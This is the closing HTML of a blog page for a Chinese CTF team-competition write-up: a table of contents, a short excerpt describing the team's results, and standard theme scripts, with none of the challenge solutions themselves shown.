+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2026-%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%90%E8%B5%9B%E9%81%93%E5%9B%A2%E9%98%9F%E8%B5%9B-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E7%A2%A7%E8%9D%8E"><span class="toc-number">1.2.1.</span> <span class="toc-text">冰碧蝎?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SecureDoc"><span class="toc-number">1.3.1.</span> <span class="toc-text">SecureDoc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asystem"><span class="toc-number">1.3.2.</span> <span class="toc-text">asystem</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base"><span class="toc-number">1.4.1.</span> <span class="toc-text">base</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#keep-stack"><span class="toc-number">1.5.1.</span> <span class="toc-text">keep_stack</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">51</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">98</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
+          title: "2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp",
+          url: "http://example.com/2026/04/14/2026%20%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%90%E8%B5%9B%E9%81%93%E5%9B%A2%E9%98%9F%E8%B5%9B%20WriteUp/",
+          excerpt: "",
+          description: "",
+          stripContent: "2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp前言第一次在星盟带队打比赛，解出了五道题排名第二  SecureDoc 是别的师傅爆破出了密码，最后由我绕过 WAF 拿到二血 asystem 其他师傅也解出来了，但是我交的快，哈哈，相当于五道题都是我解的，这波带飞了 虽然是松柏组，但是这个成绩在学生组也是能进决赛的（松柏前四） Misc冰碧蝎?过滤 HTTP  追踪第一个 POST 请求拿到密钥 1ca3b8c9c81a5fdc  后续一直在访问 &amp;#x2F;upload&amp;#x2F",
+          date: "Tue Apr 14 2026 13:18:00 GMT+0800",
+          updated: "Tue Apr 14 2026 14:43:49 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
